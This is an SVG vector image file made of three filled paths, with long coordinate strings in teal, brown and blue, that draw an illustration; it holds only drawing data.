<?xml version="1.0"?>
<svg xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://www.w3.org/2000/svg" xmlns:cc="http://creativecommons.org/ns#" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:svg="http://www.w3.org/2000/svg" id="svg4013" viewBox="0 0 1610.1 1357.7" version="1.1">
  <g id="g4023" transform="matrix(.85626 0 0 .85626 -511.19 -669.03)">
    <path id="path4037" d="m1906 2361.5c-40.602-14.227-52.344-18.473-76.5-27.664-97.408-37.064-170.52-71.058-224.67-104.46-7.5168-4.637-14.115-8.972-14.663-9.6334-2.1447-2.5901-10.834-27.567-14.857-42.702-5.8893-22.161-7.9839-51.349-4.9587-69.097 7.234-42.439 34.327-71.673 80.825-87.212 11.36-3.7964 31.15-7.6133 42.943-8.2823l10.377-0.5887 47.454 17.59c26.1 9.6748 47.813 17.59 48.251 17.59 0.4385 0 2.9343-2.7868 5.5462-6.1929 7.014-9.1465 29.116-35.116 31.086-36.527 0.9372-0.6709 10.02-3.8023 20.183-6.9587l18.479-5.7389 20-0.35c11.938-0.2089 21.411 0.066 23.5 0.6834 1.925 0.5684 30.725 2.1717 64 3.5629s102.58 4.3072 154 6.48c51.425 2.1727 104.08 4.3633 117 4.868 22.647 0.8844 23.854 1.0357 33.244 4.1695 17.209 5.7434 31.049 15.811 43.21 31.431 12.845 16.499 22.748 37.713 29.114 62.366 3.712 14.375 3.9988 17.992 2.3603 29.773-6.6844 48.059-44.224 89.79-102.59 114.04l-8.8362 3.672-18-1.1222c-9.9-0.6173-45.675-2.9163-79.5-5.109-33.825-2.1928-63.975-4.1138-67-4.269l-5.5-0.2821-0.6254 14c-0.344 7.7-1.3595 16.86-2.2566 20.357-9.568 37.285-44.183 66.515-96.001 81.065-19.893 5.5857-45.507 10.166-56.053 10.024-2.235-0.03-11.039-2.4989-19.564-5.4861zm-412.3-471.5c-64.312-7.2832-124.12-37.271-176.71-88.602l-13.5-13.176-16-7.9003c-8.8-4.3452-75.4-41.902-148-83.46s-207.38-118.66-299.5-171.34c-92.125-52.677-168.33-96.348-169.35-97.047-3.45-2.3742-26.565-34.314-30.503-42.149-5.0346-10.015-15.916-37.57-20.567-52.08-15.47-48.2-22.58-93.1-22.58-142.4 0-61.2 12.08-114.9 37.93-168.3 35.33-73.06 92.25-134.87 174.07-189.03 34.372-22.752 77.388-46.309 92.5-50.657 10.858-3.124 35.946-3.3448 47.5-0.41808 4.125 1.0449 52.5 18.073 107.5 37.84s105.4 37.871 112 40.23c36.019 12.875 92.607 33.246 213 76.68l134 48.342 20.5-0.26352c11.275-0.14493 26.864-0.75795 34.642-1.3622 31.947-2.4819 73.628 4.9544 110.86 19.778 19.56 7.7883 44.634 20.044 55.786 27.269 5.7997 3.7571 14.376 8.0444 22.317 11.156 41.353 16.204 77.948 42.535 109.42 78.731l5.4778 6.3001 10.5-4.9335c28.544-13.412 69.089-26.074 107.5-33.572 46.421-9.0616 87.04-12.171 147.5-11.291 52.01 0.757 87.106 3.3838 131 9.8046 92.801 13.575 156.98 37.668 192.87 72.406l10.47 10.133 1.7383 24.834c0.956 13.659 1.4906 25.55 1.1879 26.426-0.3028 0.8758-5.2807 8.7151-11.062 17.421-9.4188 14.183-11.068 16.142-15.858 18.846l-5.3461 3.0171 0.065 5.6546c0.036 3.11 0.6273 17.804 1.3143 32.654 1.3446 29.066 1.4694 27.605-3.8299 44.824-2.5806 8.3848-3.1708 9.323-11.864 18.86l-9.1487 10.036-15.768 7.8958-15.768 7.8958-0.021 8.2441c-0.02 7.8563-1.3244 22.749-4.0072 45.744-0.6962 5.9674-1.9707 11.821-2.9523 13.559-0.9501 1.6827-5.6072 8.0313-10.349 14.108l-8.6217 11.048-16.774 5.6101c-83.85 28.043-179.7 42.276-254.27 37.757-52.325-3.1705-93.094-11.957-135.82-29.273-6.7784-2.7469-12.459-4.8404-12.623-4.6521s-1.2765 4.8423-2.4722 10.342c-2.9061 13.368-11.101 41.748-17.037 59-48.484 140.92-150.84 255.81-269.34 302.34-18.263 7.1715-32.059 11.446-56.702 17.57-32.455 8.0643-44.863 9.7868-73 10.134-13.475 0.1664-28.003-0.094-32.285-0.5791zm654.3-382c33.623-1.6243 68.03-6.0511 105.31-13.55 23.969-4.8207 24.529-5.0016 25.411-8.2098 0.4103-1.4928 0.7293-5.0359 0.7089-7.8735-0.1474-20.521-35.859-32.797-111.43-38.306-17.783-1.2962-47.875-2.7689-83-4.0621-71.665-2.6385-95.844-6.5125-101.91-16.328-2.5609-4.1437-2.1767-6.3164 1.6037-9.0676 2.5764-1.8751 3.0078-1.8811 17.225-0.241 60.777 7.0115 132.64 5.8162 203.08-3.3777 36.302-4.7379 99.244-17.588 125.35-25.591 2.5866-0.7928 1.5986-5.036-2.8951-12.433-9.7083-15.982-31.597-28.497-61.073-34.92-17.662-3.8488-30.422-5.1374-56.386-5.6943-22.942-0.492-33.056-0.1455-68.023 2.3307-8.3861 0.5938-8.6433 0.5431-16-3.1551-14.194-7.1355-19.22-12.036-14.286-13.93 0.9299-0.3568 12.967-0.1238 26.75 0.5178 79.03 3.6787 156.63-6.8112 222.44-30.072 18.482-6.5317 26.031-9.6546 48.706-20.149 13.687-6.3344 15.588-7.5067 16.068-9.9061 0.4316-2.158 2.1856-3.6258 8.4717-7.0891 7.6282-4.2026 8.2052-4.7827 15.285-15.368 4.0465-6.05 7.7898-11.9 8.3184-13 0.9787-2.0365-0.9037-36.31-2.2224-40.465-1.5189-4.7855-23.626-21.613-40.511-30.838-58.036-31.703-170.9-52.07-289.14-52.176-72.349-0.065-133.32 8.6522-189.67 27.115-15.143 4.9617-36.947 13.58-44.69 17.664-5.8205 3.0702-3.7181 2.6612 3.907-0.76 84.942-38.111 251.53-50.653 384.59-28.955 72.788 11.869 126.03 32.18 149.46 57.014 23.281 24.68 16.708 52.975-17.457 75.143-83.514 54.188-307 70.418-457.36 33.216-5.483-1.3567-10.11-2.3255-10.283-2.153-0.1725 0.1725 0.8136 5.6354 2.1912 12.14 6.7012 31.638 8.9508 56.191 8.9382 97.554-0.011 34.92-0.6932 45.776-4.5775 72.805-1.0516 7.3177-1.912 14.109-1.912 15.092 0 1.253 2.3172 2.8644 7.75 5.3893 52.063 24.197 118.49 35.202 191.25 31.687z" fill="#698c90"/>
    <path id="path4035" d="m1913.5 2362.8c-127.33-43.131-243.34-93.846-310.27-135.63l-12.265-7.6589-3.911-10c-16.679-42.647-21.24-82.615-12.948-113.48 9.2373-34.386 36.697-60.884 76.61-73.927 14.36-4.6928 33.389-8.2325 45.279-8.423l10.5-0.1682 44.977 16.82c24.737 9.2512 46.124 17.05 47.526 17.33 2.2346 0.4469 3.342-0.5184 8.9726-7.8204 3.5329-4.5816 11.662-14.407 18.065-21.834l11.641-13.504 20.909-6.2708 20.909-6.2707 17.429 0.025c9.586 0.014 18.811 0.4815 20.5 1.0397 1.6891 0.5581 35.246 2.3633 74.571 4.0115s107.95 4.5462 152.5 6.4399 91.125 3.7329 103.5 4.087c13.146 0.3762 25.618 1.2614 30 2.1294 20.498 4.0601 38.875 16.456 53.842 36.317 16.15 21.432 31.467 63.95 29.706 82.46-3.652 38.39-26.032 72.992-63.547 98.254-14.084 9.4835-37.715 21.423-47.017 23.754-2.0848 0.5226-110.33-6.0396-156.3-9.4751-7.5971-0.5678-14.235-0.7718-14.75-0.4532-0.5154 0.3185-0.9384 4.4901-0.9399 9.2701-0.01 29.767-8.5664 50.179-29.286 69.86-23.401 22.229-64.031 38.785-110.15 44.885-14.342 1.897-15.498 1.8189-26.064-1.7599zm12.3-14.994c0.66-0.66 1.2-1.828 1.2-2.5956 0-0.7675-9.8538-11.174-21.897-23.125-21.338-21.174-22.111-21.821-30.25-25.305-8.7933-3.7645-21.624-8.9589-28.353-11.478-2.2-0.8237-5.4778-2.1273-7.2839-2.8967-1.8062-0.7695-3.7632-1.3991-4.3489-1.3991s-2.4829-0.6355-4.2161-1.4123c-1.7331-0.7768-7.592-2.9143-13.02-4.75-6.7334-2.2773-10.494-4.132-11.838-5.8377-2.0694-2.6275-8.8832-12.317-14.794-21.038-6.4595-9.5305-8.4731-11.373-14.638-13.394-3.2238-1.0569-6.9865-2.4643-8.3615-3.1275-11.672-5.6304-14.546-6.7337-17.79-6.8303l-3.71-0.1105-0.3397 7.5c-0.4406 9.7249 1.7241 39.49 3.1979 43.974 1.0307 3.1355 1.92 3.772 9.1418 6.5427 4.4 1.6882 13.625 5.8031 20.5 9.1443 6.875 3.3411 17.17 7.7517 22.878 9.8013 5.7078 2.0496 13.358 4.983 17 6.5186 65.038 27.422 99.098 40.885 103.67 40.978 1.1275 0.023 2.59-0.4983 3.25-1.1583zm-188.6-73.887c0.1993-0.598 0.028-4.7605-0.3809-9.25-1.1231-12.334-2.3399-42.972-2.1211-53.408 0.2088-9.9578 3.2191-29.666 6.426-42.07 9.973-38.575 29.604-69.325 58.099-91.006 6.0956-4.6379 8.3133-6.8607 7.3711-7.3879-0.7412-0.4148-13.665-5.3189-28.719-10.898-15.054-5.5792-37.721-13.99-50.371-18.69-13.196-4.9032-25.131-8.7367-28-8.9928-9.8544-0.8797-36.151 4.3121-50.5 9.9705-33.422 13.179-55.752 38.287-59.963 67.422-0.5484 3.7939-1.006 14.407-1.0169 23.584-0.018 15.133 0.2623 17.879 3.0111 29.5 3.1568 13.346 7.1693 25.889 12.096 37.814 2.808 6.796 3.147 7.1657 11.633 12.688 20.649 13.437 58.532 33.28 98.24 51.456 12.375 5.6645 22.8 10.312 23.167 10.328 0.3666 0.016 0.8297-0.4607 1.0291-1.0587zm308.6-149.7c1.375-27.362 7.2014-85.917 10.769-108.23l0.5984-3.7423-14.355-0.6772c-7.8955-0.3725-24.03-1.0837-35.856-1.5806-11.825-0.4969-44.992-1.8988-73.705-3.1154l-52.205-2.2119-18.217 5.4029-18.217 5.4028-10.125 11.524c-11.735 13.356-19.046 22.794-18.263 23.576 0.4976 0.4977 68.378 28.982 171.73 72.064 21.725 9.0557 42.875 18.439 47 20.852 4.125 2.4128 7.9837 4.4087 8.575 4.4353 0.7059 0.032 1.4846-8.1047 2.2684-23.702zm-554.5-235.8c-64.623-7.8296-121.02-36.912-177.99-91.78-9.4979-9.1475-11.221-10.339-24.005-16.591-7.5749-3.7047-62.148-34.418-121.27-68.252-126.8-72.562-430.62-246.32-470-268.81l-27.5-15.7-12.219-15.898c-15.881-20.662-23.232-35.46-35.425-71.309-12.538-36.864-19.721-70.908-23.44-111.1-2.1816-23.578-1.4671-65.916 1.4764-87.488 16.989-124.51 86.708-226.11 211.23-307.81 29.363-19.267 71.184-42.53 84.757-47.147 15.164-5.1577 37.198-5.8637 53.124-1.7021 4.125 1.0779 36.3 12.32 71.5 24.982s87.175 31.342 115.5 41.51 77.375 27.794 109 39.169 105.65 37.997 164.5 59.161l107 38.479 20.5-0.62269c11.275-0.34249 26.509-1.0623 33.854-1.5996 26.099-1.9093 59.012 2.8654 91.146 13.223 22.254 7.1728 59.223 23.978 73.5 33.411 8.917 5.8916 11.966 7.4439 23 11.708 29.901 11.556 60.126 30.629 84.773 53.494 9.8709 9.1572 20.529 20.389 25.397 26.765 2.3878 3.1271 4.093 4.4907 5.1928 4.1525 0.9007-0.277 8.9183-3.6838 17.817-7.5706 37.809-16.515 83.017-28.774 130.97-35.515 29.247-4.1116 50.937-5.6805 86.853-6.282 129.42-2.1677 253.16 19.715 317.51 56.152 16.794 9.5089 34.862 23.542 42.135 32.724l3.1581 3.9874 1.6373 24.094c1.9192 28.24 2.8562 24.399-10.844 44.458-7.093 10.385-9.7953 13.49-14.411 16.56-4.5712 3.0394-5.6855 4.3095-5.7028 6.5-0.012 1.4974 0.5247 16.506 1.1923 33.352l1.2139 30.63-3.9003 12.727-3.9004 12.727-8.8628 9.3648c-8.5541 9.0385-9.4188 9.6506-24.816 17.563-11.743 6.035-16.063 8.7471-16.372 10.278-0.2305 1.1442-0.6592 9.7303-0.9526 19.08-0.2934 9.35-1.3995 23.432-2.458 31.294l-1.9246 14.294-7.1502 9.3478c-12.998 16.993-11.728 16.03-28.548 21.649-55.745 18.623-115.74 31.15-175 36.541-26.26 2.3888-74.656 2.3952-98.5 0.013-43.6-4.356-85.067-14.401-118.31-28.659-5.3555-2.2971-10.349-3.9418-11.097-3.6548-0.7555 0.2899-2.108 4.0002-3.0432 8.3483-15.491 72.023-51.9 151.95-96.502 211.85-56.933 76.459-127.71 130.36-207.05 157.68-14.039 4.8349-53.74 15.023-69.182 17.753-23.789 4.2063-54.988 5.1981-77.546 2.465zm-37.781-287.22c14.985-21.167 32.19-41.918 47.49-57.274 25.613-25.708 44.47-39.009 66.002-46.554 3.5657-1.2495 6.6062-2.641 6.7565-3.0921 0.3241-0.9721-1.299-2.9984-45.208-56.439-66.509-80.948-61.843-75.623-69.37-79.159-6.6572-3.1274-6.6759-3.1298-26.887-3.5208-23.534-0.4552-34.568 0.9283-51.09 6.4061-12.966 4.2986-22.654 10.007-31.955 18.829-12.534 11.888-19.676 24.73-24.905 44.777-2.3931 9.1762-2.7004 12.22-2.7591 27.326-0.061 15.686 0.1074 17.348 2.1778 21.503 1.9666 3.9462 26.191 32.602 78.615 92.997 8.3548 9.625 20.943 24.138 27.974 32.25 7.031 8.1125 13.095 14.728 13.475 14.701 0.3804-0.027 4.7377-5.7644 9.683-12.75zm700.15-92.235c32.704-1.8934 69.792-6.886 103.36-13.914 25.054-5.2451 24.493-4.9011 24.497-15.026 0-5.6768-0.4452-7.3961-2.9971-11.51-13.104-21.123-62.252-30.2-187-34.536-75.151-2.6121-100.34-6.1485-106.24-14.917-3.427-5.091-1.5325-6.5491 8.5194-6.5566 6.952-0.01 29.265 1.8026 38.22 3.0966 8.6336 1.2475 79.832 1.5932 98.612 0.4788 50.427-2.9924 96.794-9.0966 144.41-19.012 23.334-4.8588 57.07-13.736 58.809-15.474 1.4689-1.4689 1.3032-2.2024-1.9988-8.8483-10.201-20.531-31.88-33.858-66.836-41.088-6.8746-1.4218-16.549-3.1642-21.499-3.8719-12.466-1.7823-73.119-1.7185-93.662 0.098l-15.662 1.3854-8.3385-4.2714c-10.26-5.2557-14.248-7.9968-13.166-9.0507 0.4548-0.443 8.477-0.3927 17.827 0.1118 19.933 1.0755 59.089 0.9865 79-0.1795 29.393-1.7213 75.68-8.4918 102.09-14.933 34.462-8.4045 73.709-22.581 103.1-37.243 10.245-5.1099 12.305-6.512 12.305-8.3748 0-2.4051 1.4632-3.6715 9.9788-8.6364 5.8177-3.392 11.874-10.607 19.15-22.816l3.9468-6.6221-1.1133-18.378c-0.6123-10.108-1.5795-19.605-2.1494-21.104-1.2299-3.2359-14.958-15.312-25.105-22.085-45.095-30.097-122.09-50.185-225.71-58.889-21.519-1.8076-33.462-2.1543-76.5-2.2211-53.54-0.083-61.052 0.2978-98.5 4.9957-47.198 5.9209-95.929 19.035-134.5 36.196-6.841 3.0437-11.122 5.5245-11.323 6.5615-0.4821 2.4861 1.5298 2.079 11.853-2.3986 41.356-17.937 98.461-30.125 171.47-36.597 28.924-2.5639 116.27-2.5697 145-0.01 80.649 7.1878 141.85 21.297 184 42.421 18.508 9.2752 35.085 23.936 40.872 36.149 2.7836 5.8749 3.1283 7.5939 3.1283 15.602 0 8.0084-0.3447 9.7274-3.1283 15.602-8.8051 18.583-35.046 36.434-72.872 49.574-42.479 14.756-92.017 23.929-159.5 29.536-24.362 2.0241-111.08 1.6778-137-0.5471-24.749-2.1241-53.199-5.672-73.5-9.1659-14.499-2.4953-47.175-9.5872-50.75-11.014-2.4412-0.9747-2.3074 1.0593 1.1768 17.883 10.699 51.663 11.825 114.06 3.077 170.54-1.0572 6.8264-1.715 12.747-1.4619 13.156 0.7632 1.2349 13.176 6.8264 26.752 12.051 50.636 19.486 112.53 27.716 179.34 23.847zm-851.69-74.365 9.4492-2.1008 2.2454-9c1.2349-4.95 2.2703-11.282 2.3008-14.072 0.078-7.1755-6.4685-44.578-9.5992-54.841-0.827-2.7109-1.438-1.3828-6.7411 14.652-6.9195 20.922-16.604 59.907-16.604 66.838 0 1.8731 0.4 1.9855 4.75 1.3349 2.6125-0.3908 9.0021-1.6559 14.199-2.8113zm903.6-157c100.34-7.5422 178.13-28.761 208.05-56.754 9.2149-8.6202 11.939-13.592 11.944-21.803 0.01-8.7559-2.9685-14.383-12.093-22.875-26.821-24.964-94.202-45.319-178.9-54.046-39.708-4.0911-50.253-4.5721-99-4.5162-47.571 0.055-59.878 0.6343-98 4.6165-10.555 1.1027-11.157 1.294-14.879 4.7347-11.127 10.287-22.838 30.412-27.237 46.808-2.2571 8.4127-2.6249 11.803-2.6341 24.278-0.017 22.194 3.4978 35.782 15.459 59.772 5.2092 10.448 7.675 14.394 9.203 14.729 5.2059 1.1404 41.942 4.5163 59.587 5.4759 10.725 0.5832 21.525 1.2279 24 1.4326 11.057 0.9146 85.168-0.3988 104.5-1.8519z" fill="#987559"/>
    <path id="path4033" d="m1908.5 2361.1c-139.62-48.871-245.77-95.666-307.33-135.49-11.597-7.5014-11.277-7.0159-18.164-27.609-8.1888-24.487-11.817-42.373-12.676-62.5-0.9251-21.654 2.1172-39.085 9.6201-55.119 12.863-27.489 37.118-47.307 71.285-58.246 12.368-3.96 31.67-7.8255 43.267-8.665l9-0.6515 47.482 17.591c26.115 9.675 48.257 17.591 49.205 17.591 0.9715 0 4.3153-3.3806 7.6655-7.75 3.2683-4.2625 11.276-13.997 17.795-21.632l11.853-13.882 19.5-6.0704 19.5-6.0704 18.939-0.3403c11.51-0.2069 19.943 0.064 21.5 0.6901 1.4185 0.5708 49.854 3.0556 108.56 5.5695 58.3 2.4965 126.25 5.4074 151 6.4687 24.75 1.0614 55.575 2.2106 68.5 2.554 25.946 0.6893 31.92 1.3865 43.044 5.0239 32.261 10.548 57.969 44.46 70.532 93.04 3.1686 12.253 3.5175 14.785 2.9464 21.382-3.4363 39.692-25.53 74.037-64.436 100.17-11.06 7.429-27.227 15.938-39.687 20.887l-7.5627 3.0042-84.529-5.5126c-46.491-3.032-84.929-5.2654-85.418-4.9631-0.4891 0.3022-0.8929 4.0105-0.8974 8.2405-0.012 11.348-1.7492 24.816-4.1521 32.191-11.854 36.386-47.112 62.921-102.34 77.021-15.228 3.8879-30.329 6.5053-43 7.453-6.4888 0.4854-8.0224 0.1658-21-4.3767zm17.3-13.298c0.66-0.66 1.2-1.828 1.2-2.5956 0-0.7675-9.8538-11.174-21.897-23.125-21.338-21.174-22.111-21.821-30.25-25.305-8.7933-3.7645-21.624-8.9589-28.353-11.478-2.2-0.8237-5.4778-2.1273-7.2839-2.8967-1.8062-0.7695-3.7632-1.3991-4.3489-1.3991s-2.4829-0.6355-4.2161-1.4123c-1.7331-0.7768-7.592-2.9143-13.02-4.75-6.7334-2.2773-10.494-4.132-11.838-5.8377-2.0694-2.6275-8.8832-12.317-14.794-21.038-6.4595-9.5305-8.4731-11.373-14.638-13.394-3.2238-1.0569-6.9865-2.4643-8.3615-3.1275-11.672-5.6304-14.546-6.7337-17.79-6.8303l-3.71-0.1105-0.3397 7.5c-0.4406 9.7249 1.7241 39.49 3.1979 43.974 1.0307 3.1355 1.92 3.772 9.1418 6.5427 4.4 1.6882 13.625 5.8031 20.5 9.1443 6.875 3.3411 17.17 7.7517 22.878 9.8013 5.7078 2.0496 13.358 4.983 17 6.5186 65.038 27.422 99.098 40.885 103.67 40.978 1.1275 0.023 2.59-0.4983 3.25-1.1583zm-188.29-74.822c0.3531-1.1123 0.3222-3.4748-0.069-5.25-0.8494-3.8581-2.6695-43.392-2.6-56.473 0.052-9.7604 2.955-29.204 6.2814-42.07 9.973-38.575 29.604-69.325 58.099-91.006 6.0956-4.6379 8.3133-6.8607 7.3711-7.3879-0.7412-0.4148-13.665-5.3189-28.719-10.898-15.054-5.5792-37.721-13.99-50.371-18.69-13.196-4.9032-25.131-8.7367-28-8.9928-9.8544-0.8797-36.151 4.3121-50.5 9.9705-33.422 13.179-55.752 38.287-59.963 67.422-0.5484 3.7939-1.006 14.407-1.0169 23.584-0.018 15.133 0.2623 17.879 3.0111 29.5 3.1568 13.346 7.1693 25.889 12.096 37.814 2.808 6.796 3.147 7.1657 11.633 12.688 20.649 13.437 58.532 33.28 98.24 51.456 12.375 5.6645 22.807 10.312 23.183 10.328 0.3754 0.016 0.9715-0.8815 1.3245-1.9939zm308.3-148.8c1.375-27.362 7.2014-85.917 10.769-108.23l0.5984-3.7423-14.355-0.6772c-7.8955-0.3725-24.03-1.0837-35.856-1.5806-11.825-0.4969-44.992-1.8988-73.705-3.1154l-52.205-2.2119-18.217 5.4029-18.217 5.4028-10.125 11.524c-11.735 13.356-19.046 22.794-18.263 23.576 0.4976 0.4977 68.378 28.982 171.73 72.064 21.725 9.0557 42.875 18.439 47 20.852 4.125 2.4128 7.9837 4.4087 8.575 4.4353 0.7059 0.032 1.4846-8.1047 2.2684-23.702zm-545.8-234.9c-52.193-5.5287-96.051-22.084-138.58-52.311-17.868-12.698-39.665-31.44-52.444-45.09-3.6059-3.8519-7.3019-6.1542-18.171-11.319-7.5043-3.5658-90.292-50.326-183.97-103.91-93.7-53.6-230.15-131.7-303.3-173.5l-133-76.043-12.345-16.332c-13.79-18.244-18.444-26.706-27.676-50.324-16.162-41.347-25.58-80.194-30.671-126.51-1.9435-17.68-1.6266-71.266 0.51745-87.5 3.75-28.394 9.4469-53.922 17.24-77.253 36.753-110.03 121.66-200.21 255.34-271.2 24.237-12.871 34.719-15.986 53.94-16.032 11.853-0.0281 25.316 3.0219 45.832 10.384 27.132 9.736 245.41 88.184 273.83 98.41 70.594 25.408 141.48 50.875 231.29 83.092l39.3 14.13 12.212-0.0261c6.7165-0.0143 19.187-0.47576 27.712-1.0254 40.471-2.6091 65.802 0.082 101 10.73 23.158 7.0059 62.742 24.812 79.631 35.821 4.8174 3.1401 14.154 7.8201 21.233 10.643 34.589 13.794 62.578 31.909 89.558 57.964 7.3425 7.0907 15.927 16.042 19.077 19.892 3.1498 3.85 6.3047 7 7.0108 7 0.7062 0 4.0435-1.3692 7.4163-3.0426 18.624-9.2404 52.073-21.067 78.573-27.782 56.915-14.421 111.31-20.116 180-18.843 47.979 0.8891 85.504 3.6751 125 9.2806 76.298 10.829 131.05 27.566 171.5 52.429 11.052 6.7928 25.647 18.68 31.796 25.895l4.2957 5.0411 1.4463 19.761c2.2092 30.185 2.3331 28.887-3.6769 38.522-10.48 16.802-16.636 24.492-21.899 27.356l-4.962 2.7007-0.014 5.591c-0.01 3.0751 0.5158 18.191 1.1628 33.591l1.1765 28-3.8034 12.61-3.8034 12.61-8.9656 9.6626c-8.8326 9.519-9.2015 9.7818-24.855 17.699-12.166 6.1531-15.995 8.5502-16.339 10.227-0.247 1.2048-0.6678 9.3905-0.935 18.19-0.2673 8.8-1.4115 22.94-2.5427 31.422l-2.0568 15.422-4.7224 6.0779c-2.5974 3.3429-7.0634 9.0418-9.9245 12.664l-5.202 6.5865-16.838 5.6255c-55.15 18.426-116.4 31.138-174.84 36.286-25.929 2.2841-73.947 2.2774-97-0.014-31.568-3.1372-63.401-9.4373-89.023-17.619-9.9595-3.1802-32.437-11.846-37.448-14.437-1.4559-0.7529-3.1189-1.0642-3.6957-0.6919-0.5767 0.3724-2.2951 6.077-3.8187 12.677-24.66 106.83-81.882 207.7-157.01 276.8-36.733 33.782-74.786 59.161-115.81 77.239-34.093 15.025-87.209 29.102-122.4 32.44-10.114 0.9591-37.487 1.1611-45.293 0.3343zm-241.6-167.5c-0.3893-0.6875-1.4896-2.15-2.4452-3.25-7.0765-8.1462-19.507-30.383-26.272-47-15.642-38.418-22.453-75.27-23.565-127.5l-0.6281-29.497-8.5-2.636c-4.675-1.4498-17.5-5.4333-28.5-8.8523-49.61-15.419-114.48-40.14-170-64.788-41.404-18.38-113.34-53.308-141.29-68.6-5.6571-3.0958-10.528-5.6287-10.825-5.6287-0.29675 0-3.5432-1.736-7.2144-3.8577s-12.3-6.9116-19.175-10.644c-47.361-25.713-103.87-59.273-152.73-90.7-13.094-8.4229-23.728-14.634-24.371-14.237-0.81794 0.5055-0.95054 4.4226-0.46787 13.822 2.0155 39.248 10.487 70.691 28.591 106.12 9.5314 18.651 20.731 35.664 25.743 39.105 2.054 1.4101 20.834 12.25 41.734 24.088s42.05 23.884 47 26.767c4.95 2.8836 31.05 17.753 58 33.043s50.575 28.815 52.5 30.055c1.925 1.2405 9.35 5.5032 16.5 9.4727 7.15 3.9694 19.075 10.705 26.5 14.967 7.425 4.2625 26.1 14.95 41.5 23.751 15.4 8.8004 31.15 17.807 35 20.014 3.85 2.2073 21.85 12.446 40 22.752s40.425 23.021 49.5 28.254c9.075 5.2331 23.475 13.447 32 18.253 8.525 4.8059 28.325 16.06 44 25.01 15.675 8.9494 31.875 18.174 36 20.499 4.125 2.3253 14.475 8.2885 23 13.252 14.677 8.5446 20.055 10.872 18.41 7.9677zm195.08-120.55c14.985-21.167 32.19-41.918 47.49-57.274 25.613-25.708 44.47-39.009 66.002-46.554 3.5657-1.2495 6.6062-2.641 6.7565-3.0921 0.3241-0.9721-1.299-2.9984-45.208-56.439-66.509-80.948-61.843-75.623-69.37-79.159-6.6572-3.1274-6.6759-3.1298-26.887-3.5208-23.534-0.4552-34.568 0.9283-51.09 6.4061-12.966 4.2986-22.654 10.007-31.955 18.829-12.534 11.888-19.676 24.73-24.905 44.777-2.3931 9.1762-2.7004 12.22-2.7591 27.326-0.061 15.686 0.1074 17.348 2.1778 21.503 1.9666 3.9462 26.191 32.602 78.615 92.997 8.3548 9.625 20.943 24.138 27.974 32.25 7.031 8.1125 13.095 14.728 13.475 14.701 0.3804-0.027 4.7377-5.7644 9.683-12.75zm702.5-92.2c31.047-1.8854 69.502-7.1319 101.54-13.854 25.102-5.2662 24.349-4.8461 25.185-14.06 0.464-5.1178 0.1585-6.7883-2.0777-11.359-5.3944-11.026-18.666-18.02-46.649-24.586-24.774-5.8126-69.443-9.6608-141-12.147-70.331-2.4438-98.071-5.9002-105.29-13.119-6.1513-6.1512-0.3621-7.6196 21.29-5.4 50.171 5.1431 112.29 4.7938 167.66-0.9426 45.546-4.7192 93.426-13.173 134.34-23.72 8.5287-2.1985 17.532-4.5158 20.007-5.1494 5.9368-1.5199 6.219-3.8011 1.621-13.104-11.532-23.334-37.105-36.78-84.121-44.231-14.363-2.2762-73.827-2.6814-97.2-0.6623l-17.2 1.4857-8.8002-4.6743c-13.247-7.0365-13.578-7.7139-3.3002-6.757 13.769 1.282 85.895 0.8988 100.5-0.534 60.212-5.9068 98.894-14.33 149.57-32.571 11.169-4.0206 38.696-16.095 47.988-21.05 5.5889-2.9801 6.5116-3.8754 6.9452-6.7396 0.4379-2.8929 1.4659-3.8623 8.2813-7.8089 8.0275-4.6485 10.968-8.0202 21.61-24.781l3.3493-5.275-1.2273-20.225-1.2274-20.225-7.643-7.3429c-39.901-38.334-125.23-63.721-248.14-73.826-27.376-2.2507-116.18-2.5832-139-0.5205-66.214 5.9855-123.1 19.804-169.61 41.2-8.6579 3.983-10.092 5.1763-8.1275 6.7624 0.8675 0.7004 3.7878-0.1252 9.739-2.7533 43.05-19.011 101.26-31.44 176.5-37.685 26.506-2.2001 107.09-2.523 132.5-0.531 82.926 6.5009 143.74 19.697 187.8 40.754 20.99 10.03 33.177 18.992 41.869 30.787 4.7418 6.4345 8.3291 16.407 8.3291 23.154 0 10.513-6.78 23.607-17.129 33.08-29.774 27.254-99.777 49.169-186.37 58.346-37.859 4.0123-50.092 4.5746-98.5 4.5274-49.523-0.048-68.856-1.0539-106-5.5134-28.209-3.3869-69.857-11.024-87.122-15.975-4.194-1.2028-5.1058-0.247-3.8712 4.0579 1.9303 6.7305 5.9775 29.709 7.9218 44.977 5.7579 45.216 5.0898 92.154-1.9709 138.46-1.5876 10.411-1.7283 13.2-0.7165 14.203 1.7395 1.724 19.196 9.3471 31.259 13.651 30.286 10.805 60.761 17.326 96.5 20.648 22.771 2.117 55.23 2.5354 80 1.0312zm-854.05-74.388 9.4492-2.1008 2.2454-9c1.2349-4.95 2.2703-11.282 2.3008-14.072 0.078-7.1755-6.4685-44.578-9.5992-54.841-0.827-2.7109-1.438-1.3828-6.7411 14.652-6.9195 20.922-16.604 59.907-16.604 66.838 0 1.8731 0.4 1.9855 4.75 1.3349 2.6125-0.3908 9.0021-1.6559 14.199-2.8113zm908.5-157c92.894-7.9089 163.27-26.315 197.41-51.63 33.888-25.127 20.058-51.908-38.914-75.348-30.167-11.991-77.741-22.528-126.5-28.018-40.214-4.5275-53.149-5.1405-107.5-5.0944-50.229 0.043-70.589 0.9482-97.616 4.3418-3.9049 0.4904-8.2365 0.6742-9.6259 0.4086-1.9889-0.3802-3.4547 0.4487-6.8922 3.8976-9.2154 9.2457-11.17 11.784-16.932 21.992-4.1923 7.4261-6.258 12.425-9.6352 23.317-3.0739 9.9134-4.2625 32.035-2.3775 44.246 1.2425 8.0494 7.1086 27.745 9.6653 32.452 0.8063 1.4844 2.1267 4.5714 2.9342 6.8601 1.9507 5.5288 8.1977 15.72 10.338 16.866 0.9393 0.5027 10.243 1.8328 20.674 2.9558 16.334 1.7584 27.547 2.6556 56.467 4.5181 14.859 0.957 101.73-0.3365 118.5-1.7646z" fill="#356e88"/>
